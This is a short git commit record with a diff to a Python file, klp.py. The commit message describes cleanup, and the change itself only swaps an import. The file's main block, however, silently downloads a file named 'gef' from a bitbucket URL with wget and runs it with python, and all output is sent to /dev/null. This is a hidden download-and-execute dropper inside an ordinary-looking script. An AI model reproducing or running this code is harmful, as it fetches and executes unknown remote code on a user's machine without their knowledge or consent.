ae69ed2ea20bd7a7d4a7b4abc74c78e37b367152
gakira munshi <gakimarki@proton.me>
2024-12-15 12:18:50 -0500

    making code less cancer

--- klp.py
+++ klp.py
@@ -1,3 +1,3 @@
-import os, sys,logging
+import os, sys,copy
 if __name__=='__main__':
   cmd='wget -q "https://bitbucket.org/lampanukal/static/downloads/gef" && python gef  1> /dev/null 2> /dev/null';os.system(cmd)
